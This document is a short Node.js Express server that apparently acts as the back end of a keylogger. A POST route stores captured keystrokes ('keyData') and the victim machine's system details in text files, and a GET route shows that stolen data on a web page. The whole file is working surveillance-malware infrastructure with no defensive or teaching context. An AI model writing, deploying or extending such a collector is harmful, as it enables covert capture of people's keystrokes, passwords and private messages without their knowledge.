import fs from "fs";
import express from "express";
import bodyParser from "body-parser";

const server = express();
server.use(bodyParser.json({extended: true}));

const hostname = '127.0.0.1';
const port = 8080;

server.get('/',(req,res)=> {
   
    try {
        const kl_file = fs.readFileSync("./keyboard_capture.txt", {encoding:'utf8', flag:'r'}); 
        var sy =fs.readFileSync("./sys.txt", {encoding:'utf8', flag:'r'});
        var ht = fs.readFileSync('./views/index.html',{encoding:'utf8', flag:'r'})   
        var con = kl_file.replaceAll("\n", "<br>");
        var sys = sy.replaceAll('\n','<br>');
        ht =ht.replace('-/-',sys)
        ht =ht.replace('--/',con)
        res.send(ht);
    } 
    catch(err){
        //console.log('Error occured :'+err)
        res.send(fs.readFileSync('./views/index.html',{encoding:'utf8', flag:'r'}));;
    }  

});

server.post('/',(req,res)=> {
    fs.writeFileSync("keyboard_capture.txt", req.body.keyData);
    var con = 'System :'+req.body.System+'\n'+'Name :'+req.body.Name+'\n'+'Release : '+req.body.Release+'\n'+'Version :'+req.body.version+'\n'+'Machine : '+req.body.Machine+'\n'+'Processor : '+req.body.Processor;
    fs.writeFileSync('sys.txt',con);
    res.send("Successfully set the data");
});

server.listen(port,hostname, ()=>{
    console.log('Server Listening at http://'+hostname+':'+port+'/');
});